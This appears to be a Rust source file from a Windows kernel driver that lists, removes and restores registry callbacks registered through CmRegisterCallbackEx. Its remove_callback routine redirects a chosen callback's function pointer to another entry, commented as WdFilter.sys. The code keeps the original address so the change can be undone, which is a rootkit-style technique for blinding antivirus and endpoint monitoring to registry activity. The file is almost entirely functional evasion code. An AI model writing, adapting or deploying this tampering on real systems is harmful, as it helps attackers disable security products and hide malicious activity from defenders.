use {
    core::mem::size_of,
    ntapi::ntldr::LDR_DATA_TABLE_ENTRY,
    shared::structs::{CallbackInfoInput, CallbackInfoOutput},
    wdk_sys::{
        ntddk::{ExAcquirePushLockExclusiveEx, ExReleasePushLockExclusiveEx}, 
        NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL
    },
    crate::{
        callback::{
            find_callback::{find_callback_address, CallbackResult}, 
            CallbackList, INFO_CALLBACK_RESTAURE_REGISTRY
        }, 
        includes::structs::{CallbackRestaure, CM_CALLBACK}, utils::return_module},
};

/// Structure representing the Callback Registry.
pub struct CallbackRegistry;

/// Implement a feature for the callback CmRegisterCallbackEx.
impl CallbackList for CallbackRegistry {
    unsafe fn restore_callback(target_callback: *mut CallbackInfoInput) -> NTSTATUS {
        let mut callback_info = INFO_CALLBACK_RESTAURE_REGISTRY.lock();
        let callback_type = (*target_callback).callback;
        let index = (*target_callback).index;

        if let Some(x) = callback_info.iter().position(|c| c.callback == callback_type && c.index == index) {
            let (callback_list_header, callback_count, callback_list_lock) = match find_callback_address(&(*target_callback).callback) {
                Some(CallbackResult::Registry(addr)) => addr,
                _ => return STATUS_UNSUCCESSFUL,
            };
    
            ExAcquirePushLockExclusiveEx(callback_list_lock as _, 0);

            let count = *(callback_count as *mut u32) + 1;
            let mut pcm_callback = callback_list_header as *mut CM_CALLBACK;

            for i in 0..count {
                if pcm_callback.is_null() {
                    break;
                }
    
                if i == index as u32 {
                    (*pcm_callback).function = callback_info[x].address;
                    callback_info.remove(x);
    
                    ExReleasePushLockExclusiveEx(callback_list_lock as _, 0);
                    return STATUS_SUCCESS;
                }
    
                pcm_callback = (*pcm_callback).list.Flink as *mut CM_CALLBACK;
            }

            ExReleasePushLockExclusiveEx(callback_list_lock as _, 0);

        } else {
            log::error!("Callback not found for type {:?} at index {}", callback_type, index);
            return STATUS_UNSUCCESSFUL;
        }

        STATUS_SUCCESS
    }

    unsafe fn remove_callback(target_callback: *mut CallbackInfoInput) -> NTSTATUS {
        let (callback_list_header, callback_count, callback_list_lock) = match find_callback_address(&(*target_callback).callback) {
            Some(CallbackResult::Registry(addr)) => addr,
            _ => return STATUS_UNSUCCESSFUL,
        };

        ExAcquirePushLockExclusiveEx(callback_list_lock as _, 0);

        let index = (*target_callback).index as isize;
        let count = *(callback_count as *mut u32) + 1;
        let mut pcm_callback = callback_list_header as *mut CM_CALLBACK;
        let mut callback_info = INFO_CALLBACK_RESTAURE_REGISTRY.lock();
        let mut prev_addr = 0;

        for i in 0..count {
            if i == 1 {
                prev_addr = (*pcm_callback).function as u64; // WdFilter.sys
            }

            if pcm_callback.is_null() {
                break;
            }

            if i == index as u32 {
                let addr = (*pcm_callback).function as u64;
                let callback_restaure = CallbackRestaure {
                    index: (*target_callback).index,
                    callback: (*target_callback).callback,
                    address: addr,
                    ..Default::default()
                };

                (*pcm_callback).function = prev_addr;
                callback_info.push(callback_restaure);

                log::info!("Callback removed at index {}", index);
                ExReleasePushLockExclusiveEx(callback_list_lock as _, 0);

                return STATUS_SUCCESS;
            }

            pcm_callback = (*pcm_callback).list.Flink as *mut CM_CALLBACK;
        }

        ExReleasePushLockExclusiveEx(callback_list_lock as _, 0);

        STATUS_UNSUCCESSFUL
    }

    unsafe fn enumerate_callback(target_callback: *mut CallbackInfoInput, callback_info: *mut CallbackInfoOutput, information: &mut usize) -> Result<(), NTSTATUS> {
        let (callback_list_header, callback_count, callback_list_lock) = match find_callback_address(&(*target_callback).callback) {
            Some(CallbackResult::Registry(addr)) => addr,
            _ => return Err(STATUS_UNSUCCESSFUL),
        };

        let count = *(callback_count as *mut u32) + 1;
        let mut pcm_callback = callback_list_header as *mut CM_CALLBACK;
        let (mut ldr_data, module_count) = return_module().ok_or(STATUS_UNSUCCESSFUL)?;
        let start_entry = ldr_data;

        ExAcquirePushLockExclusiveEx(callback_list_lock as _, 0);

        for i in 0..count as isize {
            if pcm_callback.is_null() {
                break;
            }
            // Iterate over the loaded modules
            for _ in 0..module_count {
                let start_address = (*ldr_data).DllBase;
                let image_size = (*ldr_data).SizeOfImage;
                let end_address = start_address as u64 + image_size as u64;
                let addr = (*pcm_callback).function as u64;

                if addr > start_address as u64 && addr < end_address {
                    let buffer = core::slice::from_raw_parts(
                        (*ldr_data).BaseDllName.Buffer,
                        ((*ldr_data).BaseDllName.Length / 2) as usize,
                    );    

                    // Module name
                    let name = &mut (*callback_info.offset(i)).name[..buffer.len()];
                    core::ptr::copy_nonoverlapping(buffer.as_ptr(), name.as_mut_ptr(), buffer.len());
            
                    // Module address
                    (*callback_info.offset(i)).address = addr as usize;

                    // Module index
                    (*callback_info.offset(i)).index = i as u8;
            
                    *information += size_of::<CallbackInfoOutput>();
                    break;
                }

                // Go to the next module in the list
                ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset ldr_data for next callback
            ldr_data = start_entry;
            
            pcm_callback = (*pcm_callback).list.Flink as *mut CM_CALLBACK;
        }

        ExReleasePushLockExclusiveEx(callback_list_lock as _, 0);

        Ok(())
    }
    
    unsafe fn enumerate_removed_callback(target_callback: *mut CallbackInfoInput, callback_info: *mut CallbackInfoOutput, information: &mut usize) -> Result<(), NTSTATUS> {
        let callback_restaure = INFO_CALLBACK_RESTAURE_REGISTRY.lock();

        let (mut ldr_data, module_count) = return_module().ok_or(STATUS_UNSUCCESSFUL)?;

        let start_entry = ldr_data;

        for (i, callback) in callback_restaure.iter().enumerate() {
            for _ in 0..module_count {
                let start_address = (*ldr_data).DllBase;
                let image_size = (*ldr_data).SizeOfImage;
                let end_address = start_address as u64 + image_size as u64;

                if callback.address > start_address as u64 && callback.address < end_address {
                    let buffer = core::slice::from_raw_parts(
                        (*ldr_data).BaseDllName.Buffer,
                        ((*ldr_data).BaseDllName.Length / 2) as usize,
                    );
                    
                    // Module name
                    let name = &mut (*callback_info.offset(i as isize)).name[..buffer.len()];
                    core::ptr::copy_nonoverlapping(buffer.as_ptr(), name.as_mut_ptr(), buffer.len());
            
                    // Module address
                    (*callback_info.offset(i as isize)).address = callback.address as usize;
        
                    // Module index
                    (*callback_info.offset(i as isize)).index = callback.index as u8;
        
                    *information += size_of::<CallbackInfoOutput>();
                    break;
                }                
                // Go to the next module in the list
                ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset ldr_data for next callback
            ldr_data = start_entry;
        }

        Ok(())
    }
}
